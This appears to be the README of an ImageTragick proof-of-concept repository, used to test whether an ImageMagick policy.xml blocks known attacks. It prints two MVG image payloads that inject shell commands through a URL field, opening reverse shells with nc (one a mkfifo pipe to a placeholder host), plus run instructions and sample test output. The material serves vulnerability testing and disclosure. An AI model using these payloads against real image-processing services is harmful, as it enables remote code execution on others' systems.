# ImageTragick POCs

## RCE_POC
----

push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/someimage.jpg"|nc -e /bin/sh 127.0.0.1 "4544)'
pop grahic-context

----
----
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://127.0.0.1/x.php?x=` rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc x.x.x.x 8989 >/tmp/f `'
pop graphic-context

----

## How To Use
```
git clone https://github.com/ImageTragick/PoCs.git
cd PoCs
./test.sh
```

To test a `policy.xml` file place it in the script directory and run `test.sh`.

## Safe Output
```
user@host:~/code/PoCs$ ./test.sh 
testing read
SAFE

testing delete
SAFE

testing http with local port: 38663
SAFE

testing http with nonce: a7DyBeV7
SAFE

testing rce1
SAFE

testing rce2
SAFE

testing MSL
SAFE
```

## Unsafe Output
```
user@host:~/code/PoCs$ ./test.sh 
testing read
UNSAFE

testing delete
UNSAFE

testing http with local port: 44755
UNSAFE

testing http with nonce: a7DvBer2
UNSAFE

testing rce1
UNSAFE

testing rce2
UNSAFE

testing MSL
UNSAFE
```
